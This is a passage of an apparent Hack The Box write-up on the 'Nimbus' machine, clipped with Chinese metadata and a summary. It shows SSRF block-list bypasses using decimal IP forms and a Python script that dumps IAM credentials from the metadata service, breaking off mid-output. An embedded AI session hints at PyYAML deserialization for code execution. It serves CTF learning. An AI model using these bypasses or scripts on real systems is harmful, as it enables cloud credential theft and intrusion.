---
title: "HTB: Nimbus"
source: https://0xdf.gitlab.io/2026/11/14/htb-nimbus.html
source_host: 0xdf.gitlab.io
clip_date: 2026-11-18T12:58:26+08:00
trace_id: bad09b9e-af11-46f2-b603-21a1a74a6db4
content_hash: 74da9ea4e7960d347251d6fc33c3ed6025801745366460553abb69e726fbc6c2
status: synced
tags:
  - SSRF
  - AWS安全
series: null
feed_source: 0xdf·HTB/逆向
ai_summary: HTB Nimbus：SSRF 拿 AWS 凭据 → SQS/PyYAML 反序列化拿容器 shell → 特权 CodeBuild 容器经内核 modprobe 路径逃逸成 root。
ai_summary_style: key-points
images_status:
  total: 27
  succeeded: 25
  failed_urls:
    - https://www.hackthebox.com/badge/image/377742
    - https://www.hackthebox.com/badge/image/109523
notion_page_id: 41c75244-d011-81ff-aeda-e7e522d89d06
ioc:
  cves:
    - CVE-2014-6271
  cwes: []
  hashes:
    - 098f6bcd4621d373cade4e832627b4f6
    - 36b3ecad8e2d570b8c53ed65e53842b3
    - 3f49a821c5c08c9e5ef49f4084ecd513
    - 648894d150483a6a8d1b9d555ff3a6f9
    - 6e33ec0fe4463a313585d4c7f1e9097c
    - c236f2af130f959a5723562fa5eff7b2
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> HTB Nimbus：SSRF 拿 AWS 凭据 → SQS/PyYAML 反序列化拿容器 shell → 特权 CodeBuild 容器经内核 modprobe 路径逃逸成 root。
> 
> - **SSRF 突破黑名单：** 作业提交的 URL 参数仅做字符串黑名单过滤（169.254、127.0.0、localhost、0x、% 等），用十进制 IP 形式（169.254.169.254 = 2852039166）绕过，借 IMDSv1（无需 token）读取 `/latest/meta-data/iam/security-credentials/nimbus-web-role` 窃取临时凭据；`.yaml` 后缀检查也可用无意义参数 `?x=test.yaml` 绕过。
> - **容器内 shell：** 凭据仅允许 SQS 操作；向 `nimbus-jobs` 队列发消息，worker.py 使用不安全的 `yaml.load(Loader=yaml.Loader)` 反序列化，可构造 Python 对象 RCE；或更直接地利用其将 `script` 字段交给 `python3 -c` 执行（bash 型反弹 shell 可躲过 30 秒超时，Python 型则随子进程被杀）。
> - **绕过 IAM 代理：** `aws.nimbus.htb` 后是 Flask 写的 iam-proxy.py，仅凭 AccessKeyId 映射角色并硬编码权限表，从不校验请求签名，Secret 无用；从容器可直连 `http://floci:4566`（Floci AWS 模拟器）绕过代理。
> - **特权容器逃逸：** 创建 CodeBuild 项目使用 `privilegedMode: true` 与镜像 `floci/floci:latest`；通过导出 `BASH_FUNC_id%%` 环境变量伪造 id 输出让构建容器存活；随后写入脚本到 overlay upperdir（宿主路径），将 `/proc/sys/kernel/modprobe` 指向它，再执行以四个 0xff 开头的假 ELF 触发内核 modprobe 调用——helper 以宿主 root、宿主命名空间运行，写入 root 的 authorized_keys 后 SSH 登录。
> - **Beyond Root：** webapp 实际不发送 SQS 消息只做预览；floci 容器挂载宿主 docker.sock，是特权构建容器能逃逸的根源。

[HTB: Nimbus](https://0xdf.gitlab.io/2026/11/14/htb-nimbus.html)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/nimbus-cover.webp)

Nimbus is a Linux box hosting a job scheduler website backed by an emulated AWS environment. I’ll abuse a server-side request forgery in the job submission form, bypassing a string block list with a decimal IP address to reach the instance metadata service and steal AWS credentials. Those credentials can send messages to an SQS queue, where a worker deserializes them with PyYAML, giving a shell in a container. From there, I’ll find the worker’s credentials and go around an IAM proxy to talk directly to the Floci emulator. I’ll create a CodeBuild project with a privileged container, using a bash exported function in an environment variable to keep the build container alive, and abuse the kernel’s modprobe path to escape to the host as root.

## Box Info

[![Nimbus](https://0xdf.gitlab.io/icons/box-nimbus.webp)](https://hackthebox.com/machines/nimbus)

[Nimbus](https://hackthebox.com/machines/nimbus)

Hard

Retire Date 14 Nov 2026

![Linux](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/85d7b9cda22fbe98.png)

OS ![Linux](https://0xdf.gitlab.io/icons/Linux.webp)

Rated Difficulty ![Rated difficulty for Nimbus](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/nimbus-diff.webp)

![Rated difficulty for Nimbus](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b8a78771a74e5d84.png)

Radar Graph ![Radar chart for Nimbus](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/nimbus-radar.webp)

![Radar chart for Nimbus](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/be48014a07d60813.png)

User

00:07:08 [Ap4sh](https://app.hackthebox.com/users/377742)

![⚠️ 图片托管失败 · Ap4sh](https://www.hackthebox.com/badge/image/377742)

Root

00:48:42 [s30s0ft](https://app.hackthebox.com/users/109523)

![⚠️ 图片托管失败 · s30s0ft](https://www.hackthebox.com/badge/image/109523)

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```swift
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.245.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-08 20:34 UTC
Nmap scan report for 10.129.245.218
Host is up, received reset ttl 63 (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
oxdf@hacky$ sudo nmap -p 22,80 -sCV 10.129.245.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-08 20:36 UTC
Nmap scan report for 10.129.245.218
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
```

Based on the [OpenSSH and Nginx](https://0xdf.gitlab.io/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 24.04 Noble LTS.

Both of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away.

There’s an HTTP redirect on port 80 to `nimbus.htb`.

### Subdomain Brute Force - TCP 80

I’ll explore the virtual host-based routing (redirect based on hostname) on port 80. I’ll use `curl` with HEAD requests to see how the server handles these redirects:

```css
oxdf@hacky$ curl -I http://10.129.245.218
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 08 Nov 2026 13:50:55 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://nimbus.htb/

oxdf@hacky$ curl -I http://10.129.245.218/testpath
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 08 Nov 2026 13:51:00 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://nimbus.htb/testpath

oxdf@hacky$ curl -I http://10.129.245.218/testpath -H "Host: 0xdf.nimbus.htb"
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 08 Nov 2026 13:51:13 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://nimbus.htb/testpath
```

It seems to preserve the path and redirect to the base domain for any domains that don’t match it.

I’ll use `ffuf` to look for any subdomains of `nimbus.htb` that don’t respond with this redirect, using `-ac` to [auto-calibrate](https://www.youtube.com/watch?v=scHcQIDHcsc) against that default response:

```
oxdf@hacky$ ffuf -u http://10.129.245.218 -H 'Host: FUZZ.nimbus.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.245.218
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.nimbus.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aws                     [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 53ms]
:: Progress: [19966/19966] :: Job [1/1] :: 763 req/sec :: Duration: [0:00:27] :: Errors: 0 ::
```

It finds one. I’ll add it and the base domain to my `/etc/hosts` file:

```
10.129.245.218 nimbus.htb aws.nimbus.htb
```

I’ll re-scan each site with `nmap` by hostname to make sure I didn’t miss anything, but there’s nothing new beyond what my normal enumeration will reveal.

### nimbus.htb - TCP 80

#### Site

The site is an “internal job scheduler” for “Nimbus Labs Engineering”:

![Nimbus internal job scheduler home page explaining how to submit YAML jobs and request SSH access to workers](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/594c58e9d9fd2c43.png)

![Nimbus internal job scheduler home page explaining how to submit YAML jobs and request SSH access to workers](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-594c58e9d9fd.webp)

The “healthcheck” link at the bottom returns JSON data on some services, all of which are on `aws.nimbus.htb`:

![Healthcheck JSON showing queue, scheduler, and storage services all at http://aws.nimbus.htb with status ok](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/336f07afaab4d04e.png)

![Healthcheck JSON showing queue, scheduler, and storage services all at http://aws.nimbus.htb with status ok](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-336f07afaab4.webp)

The “docs” link leads to `/docs`, which just returns 404 not found.

The “Sign In” link shows that they are in the process of moving to Okta for single sign-on, but for now the job submission is unauthenticated.

The “Submit Job” link leads to `/jobs` where it shows how to upload jobs:

![Submit Job page By URL tab asking for a raw Git URL to a .yaml file, noting internal addresses and metadata endpoints are blocked](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/48657592bd0064e8.png)

![Submit Job page By URL tab asking for a raw Git URL to a .yaml file, noting internal addresses and metadata endpoints are blocked](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-48657592bd00.webp)

It takes YAML or a URL hosting the YAML. The “Paste YAML” tab has a field that takes YAML:

![Paste YAML tab with a YAML body field and a note that it is parsed with safe\_load](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/29b3e008be58c309.png)

![Paste YAML tab with a YAML body field and a note that it is parsed with safe\_load](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-29b3e008be58.webp)

If I give it the example text, it shows success:

![Preview page saying the job would go to queue nimbus-jobs in us-east-1, showing the submitted YAML and the parsed Python dict](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/7e14c8652b8e8b5e.png)

![Preview page saying the job would go to queue nimbus-jobs in us-east-1, showing the submitted YAML and the parsed Python dict](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-7e14c8652b8e.webp)

It’s not clear what this actually does. It doesn’t look like I have any control over what these jobs are or what they run. No matter what I put in `runtime`, it reports success.

I’ll save the example text as `example.yaml` on my host, and start a Python webserver to host it. When I give the URL for that, it shows a similar preview:

![Preview of YAML fetched from my server at example.yaml with HTTP 200, showing the raw response and parsed dict](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5ea194eae1e52f2d.png)

![Preview of YAML fetched from my server at example.yaml with HTTP 200, showing the raw response and parsed dict](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-5ea194eae1e5.webp)

This one doesn’t have the “Submitted YAML”, but instead the “Raw response”. I’ll look at the website source in [Beyond Root](#website).

#### Tech Stack

The HTTP response headers show just Nginx:

```yaml
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 08 Nov 2026 21:15:47 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 1922
```

I’ll try loading the main page as `/index.html` or `/index.php`, but neither works. The 404 page is custom as well:

![Custom 404 page reading That page doesn't exist with a link home](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ced9d753ce6928b3.png)

![Custom 404 page reading That page doesn't exist with a link home](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-ced9d753ce69.webp)

If I look at the HTTP headers in the request to my server to get a YAML file, I’ll see it’s running Python Requests:

```
GET /example.yaml HTTP/1.1
Host: 10.10.15.169
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

That’s a strong indication that this is a Python website.

The way the website outputs the JSON-like results using ‘ is also a tell that it’s Python:

![Preview output showing the parsed YAML printed as a Python dict with single quotes](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e2a33837f3c6e86a.png)

![Preview output showing the parsed YAML printed as a Python dict with single quotes](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-e2a33837f3c6.webp)

Claude explains:

```
 ▐▛███▛█   Claude Code v2.1.322
▝▜██████▀  Opus 5.5 · Claude Ultra
 ▝▝   ▝▝   ~/nimbus

❯ i have a webserver. when i give it this: name: nightly-db-backup schedule: "0 2 * * *" runtime: python3.11, it outputs {'name': 'nightly-db-backup', 'schedule': '0 2 * * *', 'runtime': 'python3.11'}. what does the choice of ' vs " tell you about what language or stack is running on the webserver?

● It's almost certainly Python

{'name': 'nightly-db-backup', 'schedule': '0 2 * * *', 'runtime': 'python3.11'} is exactly what Python prints when you call str() or repr() on a dict. Python's string repr uses single quotes by default. The other common stacks print this differently:

  ┌──────────────────────┬──────────────────────────────────────────────────┐
  │        Stack         │          How the same data would print           │
  ├──────────────────────┼──────────────────────────────────────────────────┤
  │ Python str(dict)     │ {'name': 'nightly-db-backup', ...} ← matches     │
  ├──────────────────────┼──────────────────────────────────────────────────┤
  │ JSON (any language)  │ {"name": "nightly-db-backup", ...} (JSON         │
  │                      │ requires double quotes)                          │
  ├──────────────────────┼──────────────────────────────────────────────────┤
  │ Node.js console.log  │ { name: 'nightly-db-backup', ... } (keys have no │
  │ / util.inspect       │  quotes, spaces inside the braces)               │
  ├──────────────────────┼──────────────────────────────────────────────────┤
  │ Ruby inspect         │ {"name"=>"nightly-db-backup", ...} or {"name" => │
  │                      │  ...}                                            │
  ├──────────────────────┼──────────────────────────────────────────────────┤
  │ PHP print_r /        │ Array ( [name] => nightly-db-backup ...)         │
  │ var_dump             │                                                  │
  └──────────────────────┴──────────────────────────────────────────────────┘

Two more details point the same way: - Your input is YAML. A YAML parser turned it into a native dictionary, and the app printed that dictionary as-is instead of converting it back to JSON. This most likely means yaml.load(...) or yaml.safe_load(...) from PyYAML (or ruamel), followed by something like return str(data) or an f-string. - The "0 2 * * *" you sent in double quotes comes back in single quotes. That's Python re-quoting it on output, not your original text being echoed.

Confirming it

- Quote-switching test: send name: "it's". If Python's repr is involved, it switches to double quotes for that value and prints {'name': "it's"}. - Type tests: x: yes should come back as True, x: null as None, and x: 2026-01-01 as datetime.date(2026, 1, 1). Those are Python-specific reprs.

Why it matters

If the backend is PyYAML, the next question is which loader it uses: - Send x: !!python/tuple [1, 2]. If you get back (1, 2), it isn't using safe_load. It's using FullLoader or UnsafeLoader, or old yaml.load. If it errors, it's safe_load. - If that tag works, try !!python/object/apply:... next. With UnsafeLoader or PyYAML older than 5.1, that tag gives you code execution through YAML deserialization.

✻ Sautéed for 13s · done 8:26 PM
```

I can try the test Claude suggested:

![Submitting name: "it's" parses to {'name': "it's"}, with Python switching to double quotes](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0146a737fd66d898.png)

![Submitting name: "it's" parses to {'name': "it's"}, with Python switching to double quotes](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-0146a737fd66.webp)

It made the switch Claude said Python would make.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```sql
oxdf@hacky$ feroxbuster -u http://nimbus.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nimbus.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        8l       18w      326c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        9l       64w      876c http://nimbus.htb/login
200      GET        1l        1w      235c http://nimbus.htb/api/v1/health
200      GET       63l      366w     3453c http://nimbus.htb/jobs
200      GET       31l      257w     1922c http://nimbus.htb/
405      GET        5l       20w      153c http://nimbus.htb/jobs/preview
[####################] - 68s    30008/30008   0s      found:5       errors:0      
[####################] - 68s    30000/30000   441/s   http://nimbus.htb/
```

Nothing I haven’t already found.

### aws.nimbus.htb

The host serves an API, which returns 403 Forbidden with an error message on the root:

```typescript
oxdf@hacky$ curl http://aws.nimbus.htb/
<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>InvalidClientTokenId</Code>
    <Message>The security token included in the request is invalid.</Message>
  </Error>
  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
</ErrorResponse>
oxdf@hacky$ curl -I http://aws.nimbus.htb/
HTTP/1.1 403 FORBIDDEN
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 08 Nov 2026 21:32:52 GMT
Content-Type: text/xml; charset=utf-8
Content-Length: 305
Connection: keep-alive
```

It’s XML based, and the error says it needs a security token. The `xmlns` also references AWS.

The HTTP response headers just show Nginx. There is no 404, just this 403 with a token message. `feroxbuster` shows that as well:

```sql
oxdf@hacky$ feroxbuster -u http://aws.nimbus.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://aws.nimbus.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        8l       17w      305c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 71s    30000/30000   0s      found:0       errors:0
[####################] - 70s    30000/30000   427/s   http://aws.nimbus.htb/
```

Given all the references to AWS, I’ll try pointing the `aws` command line client at it:

```
oxdf@hacky$ aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity

aws: [ERROR]: An error occurred (NoRegion): You must specify a region. You can also configure your region by running "aws configure".
```

This is just a client-side error, before any connection to the site is made. I’ll give it a region, as well as fake auth:

```
oxdf@hacky$ AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1 aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity

aws: [ERROR]: An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid.
```

That confirms this is an AWS-like instance.

I’ve run into LocalStack before in [HTB: Bucket](https://0xdf.gitlab.io/2021/04/24/htb-bucket.html) and [HTB: Stacked](https://0xdf.gitlab.io/2022/03/19/htb-stacked.html). If this is [LocalStack](https://github.com/localstack/localstack) or a compatible emulator, it should respond to `/_localstack/health`:

```typescript
oxdf@hacky$ curl -s http://aws.nimbus.htb/_localstack/health
<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>InvalidClientTokenId</Code>
    <Message>The security token included in the request is invalid.</Message>
  </Error>
  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
</ErrorResponse>
```

This is typically unauthenticated, but it’s erroring here. I’ll work around this auth later, and dig into the fake auth proxy in [Beyond Root](#aws-auth-proxy).

## Shell as worker in container

### AWS Auth

#### SSRF Enumeration

Giving the site a URL is a perfect place for a server-side request forgery (SSRF) vulnerability. I’ll give the site a file on my host that doesn’t exist:

![Preview of a missing test.yaml on my server returning HTTP 404 with the Python http.server error page as the raw response](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/154f834d6a596cd8.png)

![Preview of a missing test.yaml on my server returning HTTP 404 with the Python http.server error page as the raw response](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-154f834d6a59.webp)

That is the raw response from the Python server:

```html
oxdf@hacky$ curl localhost/test.yaml
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
```

If I try to give it `localhost` in the URL, it fails:

![Error saying security policy blocked the URL because it targets an internal resource](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/69bf5a2776ffa584.png)

![Error saying security policy blocked the URL because it targets an internal resource](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-69bf5a2776ff.webp)

#### Filter Enumeration / Bypasses

I’ll send the POST request to Burp Repeater and explore the filter a bit. There are two things that seem to trigger errors:

-   Not targeting a `.yaml` file
-   Host based filtering preventing targeting of “internal resources”

Both of these seem to be done with simple string matching in the `url` parameter. For example, the YAML check seems to just be checking the end of the string:

![Burp Repeater with url test.yaml?x=test rejected because the URL must end in .yaml or .yml](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1802eb03499e7a93.png)

![Burp Repeater with url test.yaml?x=test rejected because the URL must end in .yaml or .yml](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-1802eb03499e.webp)

That means I can avoid the yaml filter by just putting an unneeded parameter ending in `.yaml`:

![Burp Repeater with url file.txt?x=test.yaml passing the YAML check and fetching from my server](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/758cad35d154d7c2.png)

![Burp Repeater with url file.txt?x=test.yaml passing the YAML check and fetching from my server](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-758cad35d154.webp)

The security policy must be just checking for certain strings in the URL, because `http://10.10.15.169/?x=localhost.test.yaml` also gets blocked, even though `localhost` isn’t the host:

![Burp Repeater with url 10.10.15.169/?x=localhost.test.yaml blocked by the security policy even though localhost is only in a parameter](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d06d216728356996.png)

![Burp Repeater with url 10.10.15.169/?x=localhost.test.yaml blocked by the security policy even though localhost is only in a parameter](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-d06d21672835.webp)

This tells me it’s not looking at the host and validating it. A block list is much easier to bypass than an allow list. `127.0.0.2` is blocked too, so it looks like anything starting with `127.0.0` is filtered. But `127.1` works fine:

![Burp Repeater with url 127.1 bypassing the filter and returning the nginx 301 redirect](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/3720ea2d4c2e8090.png)

![Burp Repeater with url 127.1 bypassing the filter and returning the nginx 301 redirect](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-3720ea2d4c2e.webp)

When an IP address has fewer than four parts, the last number fills the remaining bytes, so `127.1` is the same as 127.0.0.1. This is the redirect to `nimbus.htb` from the box’s own Nginx.

IP addresses are four bytes typically represented as each byte’s value (0-255) combined with “.”. But the full decimal value works as well. For example, 127.0.0.1 is 2130706433 (there are lots of free [online converters](https://ipgeolocation.io/tools/ip-to-integer)). That works too:

![Burp Repeater with url 2130706433, the decimal form of 127.0.0.1, also returning the nginx 301 redirect](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/edc62d159bd58939.png)

![Burp Repeater with url 2130706433, the decimal form of 127.0.0.1, also returning the nginx 301 redirect](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-edc62d159bd5.webp)

#### Instance Metadata Service

The Instance Metadata Service (IMDS) runs on a link-local IP address, 169.254.169.254, on cloud instances. It allows code running on an instance to get information about itself without leaving the network, including temporary credentials for the IAM role attached to the instance at `/latest/meta-data/iam/security-credentials/<role>`. The original version, IMDSv1, answers simple GET requests with no token, which is what makes it reachable through an SSRF like this one. IMDSv2 requires a session token obtained with a PUT request first.

The IP address is blocked here:

![Burp Repeater with url 169.254.169.254 blocked by the security policy](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e163d7fbcc472878.png)

![Burp Repeater with url 169.254.169.254 blocked by the security policy](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-e163d7fbcc47.webp)

The `127.1` trick won’t help here, as the short form of this address is `169.254.43518`, which still contains the blocked “169.254”. But the decimal representation is not blocked:

![Burp Repeater with url 2852039166, the decimal form of 169.254.169.254, returning latest from the metadata service](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4cd2d68f636c3873.png)

![Burp Repeater with url 2852039166, the decimal form of 169.254.169.254, returning latest from the metadata service](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-4cd2d68f636c.webp)

It lists `latest` as a path available at this instance. I’ll grab it:

![Burp Repeater fetching /latest/ from the metadata service, listing dynamic, meta-data, and user-data](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/87624c3847d2a20c.png)

![Burp Repeater fetching /latest/ from the metadata service, listing dynamic, meta-data, and user-data](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-nimbus-87624c3847d2.webp)

I could step through these and explore manually, but I’ll write a short Python script to dump it all. The metadata service returns a 308 redirect for directory paths without a trailing slash, and the site doesn’t follow redirects (as seen with the 301 from `127.1`), so the script retries those with a `/` appended:

```python
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "requests",
# ]
# ///
import html
import requests
import re
from collections import deque


def fetch_imds(imds_path: str) -> tuple[int, str]:
    data = {'url': f'http://2852039166{imds_path}?x=test.yaml'}
    resp = requests.post('http://nimbus.htb/jobs/preview', data=data)

    code_match = re.search(r"· HTTP (\d+)", resp.text)
    status = int(code_match.group(1)) if code_match else resp.status_code

    results_match = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
    results = results_match.group(1).strip() if results_match else ""

    return status, results


queue = deque(['/'])
while queue:
    path = queue.popleft()
    status, results = fetch_imds(path)

    if status == 308 and not path.endswith('/'):
        queue.append(f"{path}/")
        continue
    if status != 200:
        continue

    if path.endswith('/'):
        for entry in results.splitlines():
            entry = entry.strip()
            if entry:
                queue.append(f'{path}{entry}')
    else:
        print(f"{path}: {html.unescape(results)}")
```

It dumps the data:

```haskell
oxdf@hacky$ uv run enum_imds.py 
/latest/meta-data/ami-id: ami-0c55b159cbfafe1f0
/latest/meta-data/hostname: ip-10-0-1-42.ec2.internal
/latest/meta-data/instance-id: i-0a1b2c3d4e5f6789a
/latest/meta-data/instance-type: t3.medium
/latest/meta-data/local-hostname: ip-10-0-1-42.ec2.internal
/latest/meta-data/local-ipv4: 10.0.1.42
/latest/meta-data/iam/info: {
  "Code": "Success",
  "LastUpdated": "2025-01-15T12:34:56Z",
  "InstanceProfileArn": "arn:aws:iam::847219365028:instance-profile/nimbus-web-profile",
  "InstanceProfileId": "AIPAQX4PG7L2K9M3N5R8K"
}
/latest/meta-data/placement/availability-zone: us-east-1a
/latest/meta-data/placement/region: us-east-1
/latest/meta-data/iam/security-credentials/nimbus-web-role: {
  "Code": "Success",
  "LastUpdated": "2026-11-09T14:42:29Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
